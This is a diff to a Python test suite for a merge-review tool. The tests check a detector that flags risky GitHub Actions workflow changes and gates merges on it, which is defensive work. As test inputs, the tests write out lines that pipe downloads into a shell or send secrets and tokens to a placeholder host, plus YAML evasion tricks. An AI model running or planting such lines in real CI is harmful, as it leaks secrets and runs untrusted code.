@@ -22,6 +22,9 @@ class FakeGh:
         self.calls, self.envs, self.review, self.head = [], [], "", HEAD
         self.state, self.merge_rc, self.merge_err = state, merge_rc, merge_err
         self.login, self.user_rc = login, user_rc
+        self.files = None  # the changed files GitHub's compare lists for the card's commit (None: refused)
+        self.whole = {}  # {workflow name: its text at the card's commit} (ORCH-429; missing: not found)
+        self.rollup = []  # statusCheckRollup that `gh pr view --json statusCheckRollup` answers
         self.summary = (
             None  # what `gh pr view --json title,...` answers when the card is made (None: refused)
         )
@@ -37,6 +40,19 @@ class FakeGh:
             if self.summary is None:
                 return subprocess.CompletedProcess(argv, 1, "", "not found")
             return subprocess.CompletedProcess(argv, 0, json.dumps(self.summary), "")
+        if args[:2] == ["pr", "view"] and args[3:] == ["--json", "baseRefName"]:
+            if self.files is None:
+                return subprocess.CompletedProcess(argv, 1, "", "not found")
+            return subprocess.CompletedProcess(argv, 0, json.dumps({"baseRefName": "develop"}), "")
+        if args[:2] == ["api", f"repos/acme/app/compare/develop...{self.head}"]:
+            return subprocess.CompletedProcess(argv, 0, json.dumps(self.files), "")
+        if args[0] == "api" and args[1].startswith("repos/acme/app/contents/"):
+            name, _, ref = args[1].removeprefix("repos/acme/app/contents/").partition("?ref=")
+            if ref == self.head and name in self.whole:
+                return subprocess.CompletedProcess(argv, 0, self.whole[name], "")
+            return subprocess.CompletedProcess(argv, 1, "", "Not Found")
+        if args[:2] == ["pr", "view"] and args[3:] == ["--json", "statusCheckRollup"]:
+            return subprocess.CompletedProcess(argv, 0, json.dumps({"statusCheckRollup": self.rollup}), "")
         if args[:2] == ["pr", "view"]:
             return subprocess.CompletedProcess(argv, 0, f"{self.state}\t{self.review}\t{self.head}\n", "")
         if args[:3] == ["api", "-X", "POST"]:
@@ -141,18 +157,44 @@ def test_not_now_merges_nothing(tk, run, gh):
     assert _q(root, tid)["decision"]["action"] == "dont"
 
 
-def test_refused_merge_saves_no_answer_and_can_be_clicked_again(tk, run, gh):
+def test_refused_merge_is_sent_back_to_the_helper_with_the_reason(tk, run, gh):
     root, tid = tk
     assert _ask(run, tid)[0] == 0
-    gh.merge_rc, gh.merge_err = 1, "X Pull request acme/app#12 is not mergeable: checks are failing.\n"
+    gh.merge_rc, gh.merge_err = (
+        1,
+        "X Pull request acme/app#12 is not mergeable: the base branch policy prohibits the merge.\n",
+    )
+    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
+    assert code == 0, out + err
+    q = _q(root, tid)
+    assert q["answer"] is not None and q["decision"]["action"] == "send_back"
+    change = q["decision"]["changes"][0]
+    assert "Merge failed on GitHub, please fix it:" in change and "base branch policy prohibits" in change
+    assert "Open the pull request and merge it there." not in change
+    assert len(gh.merges) == 1
+
+
+def test_only_a_person_merge_refusal_still_refuses(tk, run, gh):
+    root, tid = tk
+    assert _ask(run, tid)[0] == 0
+    code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", "agent:claude")
+    assert code == 2 and _q(root, tid)["answer"] is None
+
+
+def test_running_checks_hold_the_merge_and_save_no_answer(tk, run, gh):
+    root, tid = tk
+    assert _ask(run, tid)[0] == 0
+    gh.rollup = [
+        {"name": "lint", "status": "COMPLETED", "conclusion": "SUCCESS", "workflowName": "ci"},
+        {"name": "tests", "status": "IN_PROGRESS", "conclusion": "", "workflowName": "ci"},
+    ]
     code, out, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
     assert code == 2
-    assert "GitHub did not merge it: Pull request acme/app#12 is not mergeable" in out + err
-    assert "Open the pull request and merge it there." in out + err
-    assert _q(root, tid)["answer"] is None
-    gh.merge_rc = 0
+    assert "1 of 2 checks still running" in out + err and "nothing was merged" in out + err
+    assert gh.merges == [] and _q(root, tid)["answer"] is None
+    gh.rollup[1].update(status="COMPLETED", conclusion="SUCCESS")
     assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
-    assert len(gh.merges) == 2 and _q(root, tid)["answer"] is not None
+    assert len(gh.merges) == 1
 
 
 def test_already_merged_is_not_merged_twice(tk, run, gh):
@@ -233,9 +275,9 @@ def test_a_required_review_is_the_persons_own_before_the_merge(tk, run, gh):
     gh.review = "REVIEW_REQUIRED"
     assert run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)[0] == 0
     acts = [c[:2] for c in gh.calls]
-    assert acts == [["api", "user"], ["pr", "view"], ["api", "-X"], ["pr", "merge"]]
-    assert gh.calls[2][:4] == ["api", "-X", "POST", "repos/acme/app/pulls/12/reviews"]
-    assert f"commit_id={HEAD}" in gh.calls[2] and "event=APPROVE" in gh.calls[2]
+    assert acts == [["api", "user"], ["pr", "view"], ["pr", "view"], ["api", "-X"], ["pr", "merge"]]
+    assert gh.calls[3][:4] == ["api", "-X", "POST", "repos/acme/app/pulls/12/reviews"]
+    assert f"commit_id={HEAD}" in gh.calls[3] and "event=APPROVE" in gh.calls[3]
     assert all(e == {} for e in gh.envs)
 
 
@@ -395,3 +437,308 @@ def test_a_doc_box_takes_status_rows_and_foot_only_in_shape():
     for bad in ([{"n": 3}], [{"title": "x", "n": -1}], [{"title": "x", "url": "https://x"}], "rows"):
         with pytest.raises(review.Refused):
             review.validate_card({**ok, "preview": {**ok["preview"], "rows": bad}})
+
+
+# ---- ORCH-305: a pull request that changes a CI workflow ----
+
+WF = ".github/workflows/addons.yml"
+
+
+def _wf_file(*added, name=WF, status="modified"):
+    patch = "@@ -1,2 +1,4 @@\n jobs:\n" + "".join(f"+{x}\n" for x in added)
+    return {"filename": name, "status": status, "additions": len(added), "deletions": 0, "patch": patch}
+
+
+def test_a_plain_workflow_change_says_it_was_checked():
+    wf = ghmerge.check_workflows(
+        [_wf_file("  pr-tests:", "    timeout-minutes: 10", "    steps:", "      - uses: actions/checkout@v4",
+                  "      - run: echo ${{ secrets.GITHUB_TOKEN }}"),
+         {"filename": "workspace/src/orch/x.py", "additions": 3, "deletions": 1, "patch": "+secrets.KEY"}]
+    )  # fmt: skip
+    assert wf["files"] == [{"name": WF, "add": 5, "del": 0}]
+    assert wf["findings"] == ["uses a token (GITHUB_TOKEN)"]  # ORCH-429: tokens are named, GitHub's own too
+    assert wf["safe"] is False  # the whole file was not read
+    plain = ghmerge.check_workflows([_wf_file("    timeout-minutes: 10")])
+    assert plain["findings"] == [] and ghmerge.workflow_words(plain) == (
+        "Workflow check: no new secrets, tokens, permissions, outside actions, risky triggers or downloads "
+        "run in a shell in added lines."
+    )
+
+
+def test_no_workflow_file_is_no_workflow_check():
+    assert ghmerge.check_workflows([{"filename": ".github/CODEOWNERS", "patch": "+x"}]) is None
+    assert ghmerge.check_workflows("not a list") is None
+
+
+@pytest.mark.parametrize(
+    ("line", "words"),
+    [
+        ("      - run: curl -d ${{ secrets.DEPLOY_KEY }} x", "reads a secret (DEPLOY_KEY)"),
+        ("      env: ${{ toJSON(secrets) }}", "reads a secret (all secrets)"),
+        ("    permissions: write-all", "changes what a job may do on GitHub (permissions)"),
+        ("      contents: write", "changes what a job may do on GitHub (permissions)"),
+        ("  job: {permissions: {contents: read}}", "changes what a job may do on GitHub (permissions)"),
+        ("    steps: [{uses: someone/x@v1}]", "uses an action from outside GitHub: someone/x@v1"),
+        ('      - "uses": "someone/y@v2"', "uses an action from outside GitHub: someone/y@v2"),
+        ("    secrets: inherit", "passes all secrets on"),
+        ("      - uses: someone/action@v1", "uses an action from outside GitHub: someone/action@v1"),
+        ("      env: {GH_TOKEN: x}", "uses a token (GH_TOKEN)"),
+        ('      - run: gh api -H "Authorization: ${{ github.token }}"', "uses a token (github.token)"),
+        ("      - run: curl -fsSL https://get.example.dev | bash", "runs a download straight in a shell"),
+        ("      - run: wget -qO- https://x.dev/i.sh | sudo -E sh -s", "runs a download straight in a shell"),
+        ("      - run: bash <(curl -s https://x.dev/i.sh)", "runs a download straight in a shell"),
+        ("      - run: curl -s https://x.dev/i.py | python3 -", "runs a download straight in a shell"),
+        (
+            "  pull_request_target:",
+            "runs on pull_request_target, which has more rights than a pull request run",
+        ),
+    ],
+)
+def test_each_risky_added_line_is_named(line, words):
+    assert ghmerge.check_workflows([_wf_file(line)])["findings"] == [words]
+
+
+def test_removed_lines_and_own_actions_are_not_findings():
+    f = _wf_file("      - uses: ./.github/actions/setup", "      - uses: github/codeql-action/init@v3")
+    f["patch"] += "-      - run: echo ${{ secrets.OLD }}\n-    permissions: write-all\n"
+    assert ghmerge.check_workflows([f])["findings"] == []
+
+
+def test_a_workflow_without_a_patch_says_open_it_and_a_removed_one_does_not():
+    big = {"filename": WF, "status": "modified", "additions": 900, "deletions": 0}
+    gone = {"filename": ".github/workflows/old.yml", "status": "removed", "additions": 0, "deletions": 40}
+    assert ghmerge.check_workflows([big, gone])["findings"] == [
+        "addons.yml is too big to check here: open it"
+    ]
+
+
+def test_the_merge_card_of_a_workflow_change_shows_the_check_first(tk, run, gh):
+    root, tid = tk
+    gh.files = [_wf_file("      - uses: someone/action@v1")]
+    code, out, err = _ask(run, tid)
+    assert code == 0, err
+    card = _q(root, tid)["card"]
+    pv = card["preview"]
+    assert (
+        pv["paras"][0]
+        == "Workflow check, look at this: uses an action from outside GitHub: someone/action@v1."
+    )
+    assert pv["rows"][0] == {"title": f"{WF} (+1 −0)"}
+    assert "GitHub waits for you to approve it" in card["why"]
+    assert PR + "/files" in json.dumps(_q(root, tid))
+
+
+def test_the_click_on_a_workflow_card_approves_that_commit_then_merges(tk, run, gh):
+    root, tid = tk
+    gh.files = [_wf_file("    timeout-minutes: 10")]
+    gh.review = "REVIEW_REQUIRED"  # the develop rule wants the code owner's review
+    _ask(run, tid)
+    code, _, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
+    assert code == 0, err
+    posts = [c for c in gh.calls if c[:3] == ["api", "-X", "POST"]]
+    assert posts and f"commit_id={HEAD}" in posts[0] and gh.merges
+
+
+def test_a_rule_set_asks_for_the_review_without_saying_so_and_the_click_still_approves(tk, run, gh):
+    root, tid = tk
+    gh.files = [_wf_file("    timeout-minutes: 10")]
+    gh.review = ""  # a rule set's code-owner review: GitHub gives no review decision at all
+    _ask(run, tid)
+    code, _, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
+    assert code == 0, err
+    posts = [c for c in gh.calls if c[:3] == ["api", "-X", "POST"]]
+    assert posts and f"commit_id={HEAD}" in posts[0] and gh.merges
+
+
+def test_no_review_is_added_when_nothing_asks_for_one(tk, run, gh):
+    root, tid = tk
+    gh.files = [{"filename": "README.md", "additions": 1, "deletions": 0, "patch": "+x"}]
+    gh.review = ""
+    _ask(run, tid)
+    code, _, err = run("review", "answer", tid, "q1", "--verdict", "ok", "--by", ME)
+    assert code == 0, err
+    assert not [c for c in gh.calls if c[:3] == ["api", "-X", "POST"]] and gh.merges
+
+
+def test_a_card_without_a_workflow_file_is_as_before(tk, run, gh):
+    root, tid = tk
+    gh.files = [{"filename": "README.md", "additions": 1, "deletions": 0, "patch": "+x"}]
+    _ask(run, tid)
+    card = _q(root, tid)["card"]
+    assert "paras" not in card["preview"] and card["why"].startswith("Your click merges it")
+
+
+def test_a_changed_local_action_counts_and_is_named():
+    act = _wf_file("    - uses: someone/z@v1", name=".github/actions/setup/action.yml")
+    wf = ghmerge.check_workflows([act])
+    assert wf["files"][0]["name"] == ".github/actions/setup/action.yml"
+    assert wf["findings"] == [
+        "changes an action the workflows run: .github/actions/setup/action.yml",
+        "uses an action from outside GitHub: someone/z@v1",
+    ]
+
+
+# ORCH-429 (owner 18 Nov): the card shows the changed lines, marks risky ones red, and a script check labels a
+# harmless change "Safe to merge" (words only: the owner still clicks Merge).
+READ_ONLY = "on: pull_request\npermissions:\n  contents: read\njobs:\n  t:\n    runs-on: ubuntu-latest\n"
+
+
+def test_a_download_into_a_file_is_not_a_download_run_in_a_shell():
+    assert (
+        ghmerge.check_workflows([_wf_file("      - run: curl -fsSLo tool.tgz https://x.dev/t.tgz")])[
+            "findings"
+        ]
+        == []
+    )
+
+
+def test_the_changed_lines_come_with_their_file_and_the_risky_ones_are_marked():
+    f = _wf_file("    timeout-minutes: 30", "          KEY: ${{ secrets.DEPLOY_KEY }}")
+    f["patch"] += "-    timeout-minutes: 20\n+\n"
+    wf = ghmerge.check_workflows([f])
+    assert wf["lines"] == [
+        {"op": "+", "text": "    timeout-minutes: 30", "file": WF},
+        {"op": "+", "text": "          KEY: ${{ secrets.DEPLOY_KEY }}", "file": WF, "risk": "secret"},
+        {"op": "-", "text": "    timeout-minutes: 20", "file": WF},
+    ]  # an empty added line is left out
+    assert wf["lines_more"] == 0 and wf["safe"] is False
+
+
+def test_a_long_change_keeps_every_marked_line_in_its_order():
+    added = [f"    # line {i}" for i in range(40)] + ["      - run: curl -s https://x.dev | sh"]
+    wf = ghmerge.check_workflows([_wf_file(*added)])
+    assert len(wf["lines"]) == ghmerge.MAX_LINES and wf["lines_more"] == 11
+    assert wf["lines"][-1]["risk"] == "download run in a shell"
+    assert wf["lines"][0]["text"] == "    # line 0"
+
+
+def test_a_read_only_workflow_with_harmless_added_lines_is_safe_to_merge():
+    f = _wf_file("    timeout-minutes: 30", "      - run: make test")
+    wf = ghmerge.check_workflows([f], {WF: READ_ONLY + "      - run: echo ${{ secrets.GITHUB_TOKEN }}\n"})
+    assert wf["safe"] is True  # GitHub's own token already in a read-only file is fine
+    assert ghmerge.workflow_words(wf).startswith("Safe to merge: ")
+    # adding a permissions block that only reads keeps it safe
+    assert ghmerge.check_workflows([_wf_file("permissions:", "  contents: read")], {WF: READ_ONLY})["safe"]
+
+
+@pytest.mark.parametrize(
+    ("whole", "added"),
+    [
+        (READ_ONLY.replace("read", "write"), "    timeout-minutes: 30"),  # the job may write
+        (READ_ONLY.replace("permissions:\n  contents: read\n", ""), "    timeout-minutes: 30"),  # not said
+        (READ_ONLY + "    env: {K: '${{ secrets.K }}'}\n", "    timeout-minutes: 30"),  # reads a secret
+        (READ_ONLY.replace("pull_request", "pull_request_target"), "    timeout-minutes: 30"),
+        (None, "    timeout-minutes: 30"),  # GitHub did not give the file
+        (READ_ONLY, "      - uses: someone/x@v1"),  # an outside action added
+        (READ_ONLY, "      env: {NPM_TOKEN: x}"),  # a token other than GitHub's own
+        (READ_ONLY, "      - run: curl -s https://x.dev | sh"),
+        (READ_ONLY, "      - run: curl -d ${{ github.token }} https://x.dev"),  # even GitHub's own token
+        (READ_ONLY, "      env: {K: '${{ SECRETS.K }}'}"),  # expressions ignore case
+        (READ_ONLY.replace("permissions:", "  permissions:"), "    timeout-minutes: 30"),  # not at the top
+        (READ_ONLY + '      contents: "wr\\u0069te"\n', "    timeout-minutes: 30"),  # an escape
+        (READ_ONLY + "      - run: curl -s u \\\n          | bash\n", "    timeout-minutes: 30"),
+        (READ_ONLY + "      - run: curl -so x.sh u\n", "    timeout-minutes: 30"),  # any download at all
+        (
+            'name: "x\npermissions: read"\n'
+            + READ_ONLY.replace("permissions:\n  contents: read\n", "")
+            + "  w:\n    permissions: write-all\n".replace("write-all", "{}"),
+            "    timeout-minutes: 30",
+        ),
+        (READ_ONLY + "x: &w write\n", "    timeout-minutes: 30"),  # an anchor
+        (READ_ONLY + "      contents: !!str write\n", "    timeout-minutes: 30"),  # a tag
+        (READ_ONLY.replace("contents: read", "contents: >\n    write"), "    timeout-minutes: 30"),  # folded
+        (READ_ONLY + "      - run: echo 'x\n", "    timeout-minutes: 30"),  # an open single quote
+        (READ_ONLY + "      env: {A: 1,\n", "    timeout-minutes: 30"),  # a flow mapping over lines
+        (READ_ONLY + "---\npermissions: write-all\n".replace("write-all", "{}"), "    timeout-minutes: 30"),
+    ],
+)
+def test_anything_risky_takes_the_safe_label_away(whole, added):
+    assert ghmerge.check_workflows([_wf_file(added)], {WF: whole})["safe"] is False
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "curl u | env bash",
+        "curl u | tee /tmp/p | bash",
+        'curl u | "bash"',
+        "wget -qO- u | sudo -E python3.12 -",
+    ],
+)
+def test_more_ways_to_run_a_download_in_a_shell(line):
+    assert (
+        "runs a download straight in a shell"
+        in ghmerge.check_workflows([_wf_file(f"      - run: {line}")])["findings"]
+    )
+
+
+@pytest.mark.parametrize("token", ["API_TOKEN_2", "npm_token", "TOKEN", "github['token']"])
+def test_more_token_names(token):
+    assert ghmerge.check_workflows([_wf_file(f"      env: {{X: ${{{{ {token} }}}}}}")])["findings"]
+
+
+def test_a_removed_workflow_is_never_safe():
+    gone = {"filename": ".github/workflows/scan.yml", "status": "removed", "additions": 0, "deletions": 40}
+    plain = _wf_file("    timeout-minutes: 30")
+    assert ghmerge.check_workflows([plain, gone], {WF: READ_ONLY})["safe"] is False
+
+
+def test_a_long_risky_line_keeps_both_ends():
+    wf = ghmerge.check_workflows([_wf_file("      - run: echo " + "x" * 300 + " ${{ secrets.K }}")])
+    assert wf["lines"][0]["text"].endswith("${{ secrets.K }}") and len(wf["lines"][0]["text"]) <= 200
+
+
+def test_a_changed_action_or_a_file_too_big_is_never_safe():
+    act = _wf_file("    - run: echo", name=".github/actions/setup/action.yml")
+    assert ghmerge.check_workflows([act], {act["filename"]: READ_ONLY})["safe"] is False
+    big = {"filename": WF, "status": "modified", "additions": 900, "deletions": 0}
+    assert ghmerge.check_workflows([big], {WF: READ_ONLY})["safe"] is False
+
+
+def test_the_card_shows_the_red_lines_and_the_phone_gets_them_as_words(tk, run, gh):
+    root, tid = tk
+    gh.files = [_wf_file("    timeout-minutes: 30", "      - run: curl -s https://x.dev | sh")]
+    gh.whole = {WF: READ_ONLY}
+    code, out, err = _ask(run, tid)
+    assert code == 0, err
+    pv = _q(root, tid)["card"]["preview"]
+    assert pv["chips"] == [{"text": "Look at the red lines", "tone": "bad"}]
+    line = "      - run: curl -s https://x.dev | sh"
+    assert pv["diff"][1] == {"op": "+", "text": line, "file": WF, "risk": "download run in a shell"}
+    from orch import review
+
+    steps = review._plain_doc(pv)["steps"]
+    assert (
+        WF in steps and "+       - run: curl -s https://x.dev | sh  (look: download run in a shell)" in steps
+    )
+
+
+def test_the_card_of_a_harmless_change_says_safe_to_merge(tk, run, gh):
+    root, tid = tk
+    gh.files = [_wf_file("    timeout-minutes: 30")]
+    gh.whole = {WF: READ_ONLY}
+    code, out, err = _ask_only(run, tid)
+    assert code == 0, err
+    pv = _q(root, tid)["card"]["preview"]
+    assert pv["chips"] == [{"text": "Safe to merge", "tone": "ok"}]
+    assert pv["paras"][0].startswith("Safe to merge: ")
+    assert [
+        "api",
+        f"repos/acme/app/contents/{WF}?ref={HEAD}",
+        "-H",
+        "Accept: application/vnd.github.raw",
+    ] in gh.calls
+
+
+def test_a_workflow_name_that_is_no_plain_path_is_not_read_whole(monkeypatch):
+    calls = []
+
+    def read(gh, args, timeout):
+        calls.append(args)
+        return subprocess.CompletedProcess(args, 0, READ_ONLY, "")
+
+    odd = {"filename": ".github/workflows/a.yml?ref=main#", "status": "modified"}
+    assert ghmerge._whole_texts(read, "gh", "acme/app", HEAD, [odd, _wf_file("x")]) == {WF: READ_ONLY}
+    assert len(calls) == 1
+    many = [_wf_file("x")] + [{"filename": f"f{i}.py"} for i in range(ghmerge.COMPARE_MAX)]
+    assert ghmerge._whole_texts(read, "gh", "acme/app", HEAD, many) == {}
